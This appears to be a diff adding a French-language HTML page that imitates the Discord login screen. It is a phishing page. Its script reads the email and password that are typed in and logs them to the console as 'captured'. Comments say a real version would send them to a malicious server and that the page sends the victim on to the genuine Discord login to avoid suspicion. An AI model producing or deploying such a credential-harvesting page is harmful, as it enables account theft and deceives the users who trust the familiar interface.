@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion Discord</title>
+    <style>
+        body {
+            background-color: #36393f;
+            font-family: Arial, sans-serif;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #2f3136;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            width: 300px;
+        }
+        h1 {
+            text-align: center;
+            color: #7289da;
+        }
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 4px;
+            background-color: #40444b;
+            color: #fff;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #7289da;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #5a6cb8;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Connexion Discord</h1>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Adresse e-mail" required>
+            <input type="password" id="password" placeholder="Mot de passe" required>
+            <button type="submit">Se connecter</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();  // Empêche la soumission normale du formulaire
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Simule l'envoi des données (en vrai, ça irait vers un serveur malveillant)
+            console.log('Email capturé: ' + email + ', Mot de passe: ' + password);
+            alert('Connexion réussie ! Vos informations ont été enregistrées.');  // Message pour simuler
+            // Redirige vers la page réelle de Discord pour éviter les soupçons
+            window.location.href = 'https://discord.com/login';
+        });
+    </script>
+</body>
+</html>
